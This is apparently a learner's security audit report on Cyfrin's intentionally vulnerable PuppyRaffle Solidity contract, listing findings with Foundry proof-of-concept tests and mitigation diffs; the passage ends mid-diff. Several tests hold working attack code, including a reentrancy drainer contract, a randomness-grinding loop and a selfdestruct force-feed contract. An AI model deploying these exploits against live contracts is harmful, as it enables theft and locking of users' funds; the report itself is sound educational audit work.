# PuppyRaffle contract from Cyfrin
> [!IMPORTANT]
> This review was made without using AI or static analysis tools to maximize the learning effect and get a baseline to compare future reports to. As of writing the report I have not watched the course and all findings below I have discovered for myself.
>
> Relevant additional information and tips from the course or static analysis tools I've used after documenting the initial findings are placed in callouts/alerts like this one to clearly indicate they have been added after writing this report and to make them easier to discover.
>
> **Current state**
> I have not started the course chapter for this project, yet, because I wanted to see how much I can find without it and without tooling. This report is thus a first version, which I will update while going through chapter 4 of the course.

The PuppyRaffle project implements a lottery in which players can enter and refund, to get a chance at winning the prize pool (from the entrance fees) at regular intervals. 20% of the entrance fees are not part of the prize pool and instead are rewarded to the contract owner.
This contract is intentionally vulnerable to showcase vulnerabilities, to be used as an exercise for security reviews/audits. It was made for the [Smart Contract Security](https://updraft.cyfrin.io/courses/security) course on Cyfrin Updraft.

Repository: https://github.com/Cyfrin/4-puppy-raffle-audit/

Commit: 16cbff119ea0e98ff09196789d8ad66488446480

## Summary
> [!NOTE]
> I have intentionally not included further details on the review process and severity descriptions, instead focusing on discovering and reporting the vulnerabilities and other findings.

|Severity|Count|
|---|---|
|High|6|
|Medium|1|
|Low|7|
|Informational|6|
|Gas improvements|3|

## Findings
### [H-1] Reentrancy: Players can refund twice and steal funds

**Description:**
Contracts can enter as players and can execute code when receiving funds. A malicious user can enter with a contract address and then call refund from it. This will call the contract back (`receive` function) which can call `PuppyRaffle::refund` again (repeat an arbitrary amount of times), which will succeed because the storage value was not updated yet.

See [Reentrancy section in Solidity documentation](https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy)

**Impact:**
An attacker can steal all funds in the contract and make it effectively unusable.

**Proof of Concept:**
Add the following test to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It demonstrates the attack. If the test passes the contract is vulnerable.
```solidity
contract PuppyRaffleTest is Test {
    // ...

    function testAttackRefundReentrancy() public playersEntered {
        // 4 players have already entered
        uint256 before = address(this).balance;

        RefundReentrancyAttacker attacker = new RefundReentrancyAttacker();
        attacker.attack{value: entranceFee}(puppyRaffle);

        // Prove the attack was successful (test succeeding means contract is vulnerable)
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(this).balance, before + 4 * entranceFee);
    }

    // Needed to receive funds to check and prove successful exploitation here instead of in the Attacker contract.
    receive() external payable {}
}

contract RefundReentrancyAttacker {
    // Temporary state variables to store the player index and contract to attack.
    uint256 public tx_index;
    PuppyRaffle public tx_target;

    /// Call this with the entrance fee required to enter into the raffle.
    function attack(PuppyRaffle target) external payable {
        // Enter this contract into the raffle.
        address[] memory players = new address[](1);
        players[0] = address(this);
        target.enterRaffle{value: msg.value}(players);

        tx_index = target.getActivePlayerIndex(address(this));
        tx_target = target;

        // Start the reentrancy attack
        target.refund(tx_index);

        // Send all the money back to the caller
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    receive() external payable {
        uint256 entranceFee = tx_target.entranceFee();
        while (address(tx_target).balance >= entranceFee) {
            try tx_target.refund(tx_index) {
                continue;
            } catch {
                // Something went wrong, abort and try to get whatever we can.
                // This might happen if we reach the recursion limit.
                break;
            }
        }
    }
}
```

**Recommended Mitigation:**
Update the state before sending the funds (Checks-Effects-Interactions pattern):
```diff
         require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+        players[playerIndex] = address(0);
         payable(msg.sender).sendValue(entranceFee);

-        players[playerIndex] = address(0);
         emit RaffleRefunded(playerAddress);
```


### [H-2] Deterministic randomness lets users know in advance who will win and gives block producers direct influence over the winner

**Description:**
In `PuppyRaffle::selectWinner`: Players (and especially block producers) have a direct influence on `msg.sender` with which they can influence the randomness used for selecting the winner. The `block.timestamp` provides no real/valuable input to the randomness because it is deterministic and can be known in advance (especially post-merge). Pre-merge `block.difficulty` is predictable and can be influenced by the block producer pre-merge; post-merge it is based on the provides RANDAO from the beacon chain, but this can still be influenced by block producers. Even normal players can do this because `block.timestamp` and `block.difficulty` are the same within a transaction, see proof of concept below.

This also applies to the rarity selection.

See [Private Information and Randomness section in Solidity documentation](https://docs.soliditylang.org/en/latest/security-considerations.html#private-information-and-randomness)

See [Secure Randomness in Solidity](https://speedrunethereum.com/guides/blockchain-randomness-solidity)

**Impact:**
Winners are not selected at random but instead some players (or block producers) can simply choose who should win. The same goes for selecting the rarity of the NFT.

**Proof of Concept:**
Add the following test to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It demonstrates the attack. If the test passes the contract is vulnerable.
```solidity
function testAttackRandomness() public playersEntered {
    // Update time and blocknumber so we can call selectWinner (normally done by waiting).
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    // Enter the attacker
    address[] memory players = new address[](1);
    players[0] = address(this);
    puppyRaffle.enterRaffle{value: entranceFee}(players);

    // Contract doesn't expose the player count, so we can either hard code it (for this test) or use our own index.
    uint256 players_length = puppyRaffle.getActivePlayerIndex(address(this)) + 1;

    // Find a msg.sender for which we win and get a legendary NFT.
    // Expected iteration count: player_count * 25
    uint256 i = 0;
    while (true) {
        address sender = address(uint160(10000 + i));
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(sender, block.timestamp, block.difficulty))) % players_length;
        uint256 rarity = uint256(keccak256(abi.encodePacked(sender, block.difficulty))) % 100;

        bool good = winnerIndex == 4 && rarity > 95;
        if (good) {
            // In practice this would need to be done via CREATE2 or off-chain by someone that knows timestamp and difficulty.
            // For simplicity I'm using the vm.prank functionality from foundry.
            vm.prank(sender);

            // We know we will be the winner, so let's call selectWinner.
            puppyRaffle.selectWinner();

            break;
        }
        i += 1;
    }
    console.log("Iteration count: ", i);

    uint256 token_id = 0; // This is the first time we call selectWinner in this test.

    assertEq(puppyRaffle.previousWinner(), address(this));
    assertEq(puppyRaffle.balanceOf(address(this)), 1);
    assertEq(puppyRaffle.tokenIdToRarity(token_id), puppyRaffle.LEGENDARY_RARITY());
}

// Needed so we (the testing contract) can receive the NFT.
function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
    return this.onERC721Received.selector;
}
```

This example uses `vm.prank` from foundry to manipulate `msg.sender`, but the same can be achieved on the real chain using the `CREATE2` opcode, by having a list of public keys that can be used, or by being the block producer and knowing the timestamp and difficulty in advance.

**Recommended Mitigation:**

Option 1: Get randomness from an external oracle (e.g. [ChainLink VRF](https://docs.chain.link/vrf))

Option 2: Commit to the randomness in advance in a way that hides it for all transactions before `PuppyRaffle::selectWinner`. This could be a hashed value that is posted on-chain and revealed by the contract owner after `selectWinner` was called. This can be problematic because the owner knows the randomness, but that can be reduced if each player adds his own randomness when joining. But this option still has the issue that the owner could refuse to open his committment if he doesn't like the winner, forcing players to refund.

### [H-3] Integer Overflow in `PuppyRaffle::totalFees` resulting in the owner's fees locked forever

**Description:**
`PuppyRaffle::totalFees` are stored as a `uint64`, which can store a maximum of $18.4467$ ETH. This represents raffle fees worth $92.23$ ETH and is thus realistically reachable. This can happen both within a single raffle round and across multiple raffle rounds.

**Impact:**
Owner fees can get locked forever (including fees from future rounds) if the amount of raffle tickets between `PuppyRaffle::withdrawFees` calls ever exceeds $92.23$ ETH.

**Proof of Concept:**
Add the following test to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It demonstrates the attack. If the test passes the contract is vulnerable.
```solidity
function testAttackTotalFeesOverflow() public {
    // Entrance fee: 10^18 = 1 ETH
    // With this fee we need 93 players to cause the integer overflow (as only 1/5 contributes to the overflow variable.
    uint256 player_count = 93;

    // Enter with enough players
    address[] memory players = new address[](player_count);
    for (uint i = 0; i < player_count; i++) {
        players[i] = address(1000+i);
    }
    puppyRaffle.enterRaffle{value: entranceFee * player_count}(players);

    // Forward time so we can select a winner
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    uint256 expectedPrizeAmount = ((entranceFee * player_count) * 20) / 100;

    // Select winner
    puppyRaffle.selectWinner();

    // Try to withdraw (logic is inverted because I want the test to pass if the contract is vulnerable).
    vm.prank(feeAddress);
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```

**Recommended Mitigation:**

Option 1 (recommended): Store the totalFees as a `uint256`, the gas savings from having them in the same slot as `PuppyRaffle::feeAddress` are small (given that it is rarely used):
```diff
     address public feeAddress;
-    uint64 public totalFees = 0;
+    uint256 public totalFees = 0;
```

```diff
-        totalFees = totalFees + uint64(fee);
+        totalFees = totalFees + fee;
```

Option 2: Store the number of tickets instead of the fee. $2^64$ tickets is basically unreachable:
```diff
     address public feeAddress;
-    uint64 public totalFees = 0;
+    uint64 public withdrawableTicketCount = 0;
```

```diff
-        totalFees = totalFees + uint64(fee);
+        withdrawableTicketCount = withdrawableTicketCount + uint64(players.length);
```

```diff
     function withdrawFees() external {
-        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
-        uint256 feesToWithdraw = totalFees;
-        totalFees = 0;
+        uint256 feesToWithdraw = uint256(withdrawableTicketCount) * entranceFee
+        require(address(this).balance == feesToWithdraw, "PuppyRaffle: There are currently players active!");
+        withdrawableTicketCount = 0;
```

### [H-4] Balance missmatch or forcing funds into the contract can make owner funds non-withdrawable

**Description:**
A contract's balance can increase even if it doesn't have a `receive` function. This causes the contract balance to no longer match up with the `totalFees`, resulting in the following require statement always reverting.

```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Examles for such a forced balance increase:
- `selfdestruct` opcode (deprecated in [EIP-6049 (Shanghai)](https://eips.ethereum.org/EIPS/eip-6049), modified in [Cancun](https://eips.ethereum.org/EIPS/eip-6780))
- Receiver of beacon chain funds (suggested_fee_recipient)

**Impact:**
Owner cannot withdraw the funds allocated to him.

**Proof of Concept:**
Add the following test to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It demonstrates the attack. If the test passes the contract is vulnerable.

```solidity
contract PuppyRaffleTest is Test {
    // ...

    function testAttackForcefedFundsLocksFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Force-feed a small amount of ETH to the contract
        ForceFeed _ = new ForceFeed{value: 1}(payable(address(puppyRaffle)));

        puppyRaffle.selectWinner();

        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

contract ForceFeed {
    constructor(address payable receiver) payable {
        selfdestruct(receiver);
    }
}
```

**Recommended Mitigation:**
Remove this require statement or change it to `>=`. If there is a desire to prevent `withdrawFees` from being called while players are in the raffle (don't know why that would be desireable) it would be better to have a require based on `players.length`.

### [H-5] Incorrect prizePool calculation after refunds making the contract unusable and locking all funds.

**Description:**
When calling `PuppyRaffle::selectWinner`, the players that have refunded are still taken into account for `totalAmountCollected` and thus `prizePool` and `fee`/`totalFees`, even though their ETH has been refunded and is no longer available.

**Impact:**
`PuppyRaffle::selectWinner` always reverts (bricking the contract). This attack could only be circumvented/responded to by force feeding the missing ETH back into the contract.

**Proof of Concept:**
Add the following test to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It demonstrates the attack. If the test passes the contract is vulnerable.
```solidity
function testAttackRefundsBreakContract() public {
    // Use our own addresses to not run into problems with precompiles
    address[] memory players = new address[](4);
    players[0] = address(1001);
    players[1] = address(1002);
    players[2] = address(1003);
    players[3] = address(1004);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    // Refund from any player, doesn't have to be the winner
    vm.prank(address(1001));
    puppyRaffle.refund(0);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
    puppyRaffle.selectWinner();
}
```

**Recommended Mitigation:**
Keep track of how many players have refunded and don't include them in the prize pool and owner fee calculations.

### [H-6] Gaps in players list prevent joining after 2 or more players refunded
**Description:**
If a player withdraws the contract leaves a gap in the players list. This gap still counts like a player (see H-5, M-1 and I-1). Since all players that refund are set to the same value (address(0)), the invariant that there are no duplicate addresses no longer holds.

**Impact:**
This invariant is checked in `PuppyRaffle::enterRaffle`, preventing new players from joining after 2 or more players have refunded.

**Proof of Concept:**
Add the following test to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It demonstrates the attack. If the test passes the contract is vulnerable.

```solidity
function testAttackTwoRefundsPreventEnterRaffle() public playersEntered {
    vm.prank(playerOne);
    puppyRaffle.refund(0);
    vm.prank(playerTwo);
    puppyRaffle.refund(1);

    address[] memory players = new address[](1);
    players[0] = address(1005);
    vm.expectRevert("PuppyRaffle: Duplicate player");
    puppyRaffle.enterRaffle{value: entranceFee}(players);
}
```

**Recommended Mitigation:**
Applying the suggestions in G-3 would help, but the better solution would be to not have gaps in the players list, as also recommended in M-1.

### [M-1] Entering with `address(0)` or refunding can cause `selectWinner` to revert

**Description:**
An attacker can enter the raffle with `address(0)`, which causes `_safeMint` to revert if this is chosen as the winner. He can also enter with an arbitrary address and then call `PuppyRaffle::refund`, which replaces his entry with `address(0)` (only costs him some gas, he can do the second option multiple times). At the end of `PuppyRaffle::selectWinner`, `_safeMint` is called, which always reverts when given `address(0)`:

```solidity
// Called by _safeMint
function _mint(address to, uint256 tokenId) internal {
    if (to == address(0)) {
        revert ERC721InvalidReceiver(address(0));
    }
// ...
```

Since the attacker (or even normal players) can insert an arbitrary amount of `address(0)`, they can increase the probability for `PuppyRaffle::selectWinner` to revert arbitrarily (at low costs).

Note: I would count this as a High severity if it does not revert, because then it would allow the attacker to actually cause the prize pool to get burned, which would be worse than having the ability to retry `selectWinner`.

**Impact:**
With the current implementation (problematic randomness, see H-2) this only results in failing transactions and `PuppyRaffle::selectWinner` can be tried again (because the "randomness" changes), but this will likely cause bigger problems when that is fixed, as described above.

**Proof of Concept:**
Add the following tests to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It demonstrates the attack. If the test passes the contract is vulnerable. One demonstrates this vulnerability by entering with `address(0)`, the other by using `PuppyRaffle::refund` (with a small workaround for H-5).

```solidity
function testAttackRevertsWithRefundedAccounts() public {
    // Use our own addresses to not run into problems with precompiles
    address[] memory players = new address[](4);
    players[0] = address(1001);
    players[1] = address(1002);
    players[2] = address(1003);
    players[3] = address(1004);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    // Refund the player that wins (may have to choose a different player if your setup differs,
    // or if the selectWinner is sent from a different account, at a different time or with a different difficulty.
    vm.prank(address(1004));
    puppyRaffle.refund(3);

    // Due to a different issue that breaks the contract after refunds I have to
    // force the missing fees back into the contract to demonstrate this.
    ForceFeed _ = new ForceFeed{value: entranceFee}(payable(address(puppyRaffle)));

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    vm.expectRevert("ERC721: mint to the zero address");
    puppyRaffle.selectWinner();
}

function testAttackRevertsWithZeroAddressWinner() public {
    // Note that we have a different winner, likely because we did not have the refund transaction.
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = address(0);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    vm.expectRevert("ERC721: mint to the zero address");
    puppyRaffle.selectWinner();
}
```

Using the `ForceFeed` helper contract from H-4:
```solidity
contract ForceFeed {
    constructor(address payable receiver) payable {
        selfdestruct(receiver);
    }
}
```

**Recommended Mitigation:**
The easiest option would be to reroll the randomness, but that can result in a large amount of gas consumption and still end up in DoS.

Simply skipping `_safeMint` is not a valid option either, as that allows an attacker to reduce the probability for other players to win without having to spend a significant amount of ETH (refunds only cost some gas).

The best solution is probably to not have gaps in the players list, but that does mean refunds from players near the end of the list can fail because their address was moved to a different index, but that's unlikely to happen multiple times. The easiest way to do is, is to move the last entry of the list to the place the player was, that way only 2 (3 with the length) storage slots are modified and there are no gaps. `PuppyRaffle::enterRaffle` should also be changed to revert when `addreess(0)` tries to enter.

### [L-1] `O(n²)` complexity in `PuppyRaffle::enterRaffle` limits effective player count

**Description:**
To prevent a single address from entering multiple times `PuppyRaffle::enterRaffle` the player list is checked for duplicates, which can cost a lot of gas.

If the contract would only do `SLOAD` instructions the number of players would be hard capped at 7979, just from the base transaction cost and the SLOD instructions (2^24 gas cap in [EIP7825 (Fusaka)](https://eips.ethereum.org/EIPS/eip-7825)). Accounting for repeated `SLOAD` (2 reads per iteration) the limit would be around 400 players. The practical limit (which also accounts for looping and other logic) seems to be around 200 players (tested with the proof of concept code).

> [!NOTE]
> In a real review I probably wouldn't go as far as to calculate the theoretical and then measure the real limit, but I was curious to know how low the limit actually is.

**Impact:**
Due to a maximum amount of gas a single transaction can have this effectively limits the contract to approx. 200 players in a single raffle round.

**Proof of Concept:**
Add the following test to `PuppyRaffleTest` (in `test/PuppyRaffleTest.t.sol`). It tries to add as many players as possible before the `PuppyRaffle` contract runs out of gas and outputs the maximum number of players. Run with `forge test --mt testAttackEnterTxGasLimit -vv`

```solidity
function testAttackEnterTxGasLimit() public {
    // Add the first few players in a bulk txn so we don't run out of the gas we get from foundry.
    address[] memory players2 = new address[](50);
    for (uint256 x = 0; x < 3; x++) {
        for (uint256 i = 0; i < 50; i++) {
            players2[i] = address(2000 + 50*x + i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * 50}(players2);
    }

    address[] memory players = new address[](1);

    for (uint256 i = 0; i < 1000; i++) {
        players[0] = address(1000 + i);

        // Foundry gives us a lot of gas to work with, but we can limit the contract call to the txn limit,
        // even though it's not completely accurate.
        try puppyRaffle.enterRaffle{gas: 1<<24, value: entranceFee}(players) {
        } catch {
            console.log("enterRaffle failed while adding one more player:", 150 + i);
           break;
        }
    }

    // For completeness: Make sure it would work without the txn gas limit.
    // This is not allowed on the real network.
    puppyRaffle.enterRaffle{gas: 1<<25, value: entranceFee}(players);
}
```

**Recommended Mitigation:**
This is unfortunately hard to mitigate.

Option 1: Keep it as is but improve complexity to `O(n * players_added)`. See G-3.

Option 2 (recommended if possible): Remove "no duplicate addresses" restriction. It's impact is already minimal since a player can easily generate a lot of key pairs (Externally Owned Accounts) and enter them using a single transaction. It currently does not have a significant impact on how players can use the contract.

Option 3: Use an additional `mapping` to store whether an address has joined the raffle (the current list is still needed for efficient winner selection). This is a more complex solution and requires not only storing the index into the list (which makes `getActivePlayerIndex` cheaper) but also a raffle index that is incremented in `PuppyRaffle::selectWinner` (or something similar). Without the latter the mapping cannot be reset. I'd only take this option if the other two are not an option, as it adds complexity.

### [L-2] Winner can consume a lot of gas during `selectWinner` and "freeload"

**Description:**
If the winner is a contract, it can consume as much gas as he wants/is given, thus making the `PuppyRaffle::selectWinner` transaction expensive.

**Impact:**
The caller of `PuppyRaffle::selectWinner` effectively pays the gas for the winner contract's execution.

**Recommended Mitigation:**

Option 1: Limit the gas available to the winner's contract (can be problematic for contract-based wallets if gas costs change in the future).
```diff
-        (bool success,) = winner.call{value: prizePool}("");
+        (bool success,) = winner.call{value: prizePool, gas: 2300}("");
```

Option 2: Store winner & amount in a variable and let the winner withdraw himself, like is done for the owner.

### [L-3] Rarity probabilities are off by one percent

**Description:**
The actual probability of geting a common token is 71% instead of the configured 70%, the actual probability for legendary is 4% instead of the confgigured 5%.

**Impact:**
Likely not the intended probabilities and could cause legal trouble if the advertised probabilities do not match the actual probabilities.

**Recommended Mitigation:**
```diff
-        if (rarity <= COMMON_RARITY) {
+        if (rarity < COMMON_RARITY) {
             tokenIdToRarity[tokenId] = COMMON_RARITY;
-        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
+        } else if (rarity < COMMON_RARITY + RARE_RARITY) {
             tokenIdToRarity[tokenId] = RARE_RARITY;
         } else {
             tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
         }
```

### [L-4] Randomness is slightly biased towards players entering early

**Description:**
Selecting the winner by taking a random uint256 modulo player_count has a small bias/preference towards low indicies if 2^256 is not a multiple of player_count. This probability could be seen as negligible (thus low severity), but I'd still recommend fixing it.

```solidity
uint256 winnerIndex = uint256(keccak256(...)) % players.length;
```

**Impact:**
Although this bias is tiny, it does mean the raffle is not completely fair, which could cause legal problems because the chance to win does not match the reported/advertised chances.

**Proof of Concept:**
If 7 players participate in the raffle (`players.length == 7`) the players at index 2-7 each have $floor(2^256 / 7)$ numbers they would win at, while the players at index 0 and 1 each have $floor(2^256 / 7) + 1$ numbers they would win at, thus resulting in different probabilities for different players.

**Recommended Mitigation:**
If `uint256(keccak256(...))` is larger than `2^256 - 2^256 % players.length` (be careful when implementing this) don't use that number but instead compute a new one (e.g. by hashing again) until the value is below. This effectively removes all numbers that add this bias. And this loop will only rarely run more than once.

### [L-5] Rarity stored as probability can cause problems if two rarities have the same probability

**Description:**
The per-token rarity is currently stored as its probability in `PuppyRaffle::tokenIdToRarity`. This is not a problem with the current configuration, but it is not intuitive and will break if there are to rarities with the same probability (they would not be distinguishable). This could happen if the contract is modified to add another rarity level or if the probabilities are modified between this review and contract deployment.

This way of storage additionally makes it more difficult to upgrade the contract if that is added at some point in the future.

I'm marking this as low-severity instead of informational because it is an easy fix and avoids future problems should someone adjust the probabilities without another security review.

**Impact:**
A rare token and a legendary token would get the same rarity value, resulting in incorrect data returned by `PuppyRaffle::tokenURI`.

**Proof of Concept:**
```solidity
uint256 public constant RARE_RARITY = 10;
uint256 public constant LEGENDARY_RARITY = 10;
```

All rare tokens would then be reported as legendary from `PuppyRaffle::tokenURI`.

**Recommended Mitigation:**
Change `PuppyRaffle::tokenIdToRarity` to use an enum (or a number that is independent of the probability to get that token):
```solidity
enum Rarity {
    Common,
    Rare,
    Legendary
}

mapping(uint256 => Rarity) tokenIdToRarity;
```

### [L-6] `PuppyRaffle::getActivePlayerIndex` has overlapping outputs, can cause caller to miss-interpret

**Description:**
`PuppyRaffle::getActivePlayerIndex` returns 0 when an account was not found and the player is the first one in the players list. The caller cannot know which of these is the case without looking into the `PuppyRaffle::players` array.

**Impact:**
This has no impact on the contract itself, but a UI or other contracts using the `PuppyRaffle` contract will likely confuse these two situations and take wrong conclusions or display bad data to the user.

**Recommended Mitigation:**
Use a different value for the "not active" case (e.g. 0xffff..ffff), return a second boolean or revert if the player is not active.

### [L-7] Incorrect `prizePool` and `totalFees` calculation can lock owner funds if `entranceFee` is not a multiple of 5.
**Description:**
In `PuppyRaffle::selectWinner` the entranceFees paid by the users are split between the prize pool (80%) and the owner (20%). However, this implementation only works if `entranceFee` is a multiple of 5, as both parts are rounded down.

```solidity
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```

Here is a table, showcasing a few entries where this does not work as expected:

| totalAmountCollected | prizePool | fee | prizePool + fee| correct |
| --- | --- | --- | --- | --- |
| 1000 | 800 | 200 | 1000 |✅|
| 1001 | 800 | 200 | 1000 |❌|
| 1002 | 801 | 200 | 1001 |❌|
| 1003 | 802 | 200 | 1002 |❌|
| 1004 | 803 | 200 | 1003 |❌|
| 1005 | 804 | 201 | 1005 |✅|

**Impact:**
This is not as bad as having a sum larger than `totalAmountCollected`, but it's still not accurate and results in an unexpected contract balance, which is especially problematic due to the require statement in `PuppyRaffle::withdrawFees`, making the fees impossible to withdraw without forcing ETH into the contract (See H-4).

**Proof of Concept:**
Add this foundry test (test passing means contract has this bug):
```solidity
contract PuppyRaffleOddFeesTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18 + 1;     // <-------------
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function testAttackFeeCalculationBug() public {
        address[] memory players = new address[](4);
        players[0] = address(1001);
        players[1] = address(1002);
        players[2] = address(1003);
        players[3] = address(1004);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

```

**Recommended Mitigation:**

Option 1 (recommended): Only divide once and calculate the remaining difference. That way the sum always matches the `totalAmountCollected`:
```diff
 uint256 totalAmountCollected = players.length * entranceFee;
 uint256 prizePool = (totalAmountCollected * 80) / 100;
-uint256 fee = (totalAmountCollected * 20) / 100;
+uint256 fee = totalAmountCollected - pricePool;
```

Option 2: Document the "multiple of 5" restriction and enforce it using a require statement in the constructor. This has the downside of potentially breaking when updating the ratios.

### [I-1] `_isActivePlayer` is unused and returns true for `address(0)` if a player refunded.

**Description:**
This function may be intended for a contract that extends this one, but other than that it is currently unused. It also has a small bug where `address(0)` is considered active if any player has called `PuppyRaffle::refund`.

The impact of this is minimal to non-existent so this could also be ignored. In that case this behavior should still be documented.

**Recommended Mitigation:**
Change how players are stored after a refund or add an extra check to mark address(0) as always not active.

### [I-2] Conflicting/Incorrect documentation

**Description:**
The natspec documentation on `PuppyRaffle` states that `participants` in `PuppyRaffle::enterRaffle` can be used "to enter yourself multiple times". At the same time it states that "Duplicate addresses are not allowed". These cannot both be true at the same time (only by using different addresses you have the private key for). The implementation ensures the "Duplicate addresses are not allowed", so I'm going to assume this is the intended behavior.

In addition, the documentation is not quite complete, as you can also add other players without adding yourself.

> [!NOTE]
> In a real review I'd have asked which is the intended behavior.

**Recommended Mitigation:**
If "Duplicate addresses are not allowed" is the correct behavior:
```diff
-///    1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
+///    1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself and/or a group of your friends.
```

### [I-3] Inaccurate documentation: "Every X seconds"

**Description:**
According to the documentation the raffle be withdrawable every X seconds, but the implementation allows withdrawals X seconds after the last winner was selected (last withdrawal). This is likely a mistake in the documentation. Both variants are probably valid.

As a secondary note: Players can enter after the time of X seconds has passed, which is likely the intended behavior but isn't explicitly documented.

**Recommended Mitigation:**
```diff
-/// 4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
+/// 4. X seconds after the last selectWinner, the raffle will be able to draw a winner and be minted a random puppy.
```

### [I-4] Using `totalSupply` for the next tokenId only works when tokens cannot be burned

**Description:**
The current use of `totalSupply` should be fine, I could not find a reachable situation where it isn't. But this is only the case as long as it is not possible to burn tokens or reduce the token supply in any way.

```solidity
uint256 tokenId = totalSupply();
```

**Recommended Mitigation:**
I'd recommend using your own uint256 to store the next tokenID (i.e. how many have been minted) to avoid this risk.

### [I-5] Probabilities are easy to missconfigure

**Description:**
`PuppyRaffle::selectWinner` contains an implicit assumption that `COMMON_RARITY + RARE_RARITY + LEGENDARY_RARITY == 100` and such a config change may not be detected.

**Recommended Mitigation:**
Add an explicit `assert` or compute the modulo from these configured probabilities. Both should result in identical gas costs since all three configuration values are constant.

### [I-6] Testing Environment: Use of precompile addresses as user accounts can hide issues and cause confusing errors
**Description:**
`PuppyRaffleTest.t.sol` (out of scope, therefore only informational) uses the addresses 0x01 to 0x04 for player addresses. These addresses are reserved for the precompiles. This can result in unexpected behavior and tests not testing what they should, as these addresses behave slightly differently to normal externally owned accounts.

**Recommended Mitigation:**
Use higher address numbers:
```diff
-    address playerOne = address(1);
-    address playerTwo = address(2);
-    address playerThree = address(3);
-    address playerFour = address(4);
+    address playerOne = address(1001);
+    address playerTwo = address(1002);
+    address playerThree = address(1003);
+    address playerFour = address(1004);
```


### [G-1] Avoidable deployment costs

**Description:**
`PuppyRaffle::rarityToUri` and `PuppyRaffle::rarityToName` can be implemented with a basic switch case statement. This saves gas costs on deployment because these two mappings don't need to be filled and it would even make `PuppyRaffle::tokenURI` cheaper (doesn't really matter since it's a view function and not inteded to be called on-chain).

**Recommended Mitigation:**
In the constructor:
```diff
-        rarityToUri[COMMON_RARITY] = commonImageUri;
-        rarityToUri[RARE_RARITY] = rareImageUri;
-        rarityToUri[LEGENDARY_RARITY] = legendaryImageUri;
-
-        rarityToName[COMMON_RARITY] = COMMON;
-        rarityToName[RARE_RARITY] = RARE;
-        rarityToName[LEGENDARY_RARITY] = LEGENDARY;
    }
```

In `PuppyRaffle::rarityToUri`:
```diff
-        string memory imageURI = rarityToUri[rarity];
-        string memory rareName = rarityToName[rarity];

+        string memory imageURI = "";
+        string memory rareName = "";
+        if (rarity == RARE_RARITY) {
+            imageURI = rareImageUri;
+            rareName = RARE;
+        }
+        else if (...) ...
```

### [G-2] State variable could be constant or immutable

**Description:**
`PuppyRaffle::commonImageUri`, `PuppyRaffle::rareImageUri` and `PuppyRaffle::legendaryImageUri` are currently state variables but can be marked constant. Currently they store their hard-coded data in a storage slot instead of using it when needed, which unneccessarily increases deployment gas costs.

**Recommended Mitigation:**
```diff
-    string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
+    string private constant commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
```

The same for the other 2.

### [G-3] Inefficient duplicate player check

**Description:**
`PuppyRaffle::enterRaffle` currently checks the entire `players` list for duplicates, even though we know the first half (`players.length - newPlayers.length`) is already sorted and thus doesn't need to be checked.

The cost in `SLOAD` instructions alone would go from approx. $2100*(n-added) + n(n-1)$ to $2100*(n-added) + n*added$ (with n being the new player count).

**Recommended Mitigation:**
```diff
     function enterRaffle(address[] memory newPlayers) public payable {
         require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
+        uint256 prePlayerCount = players.length;
         for (uint256 i = 0; i < newPlayers.length; i++) {
             players.push(newPlayers[i]);
         }

         // Check for duplicates

-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
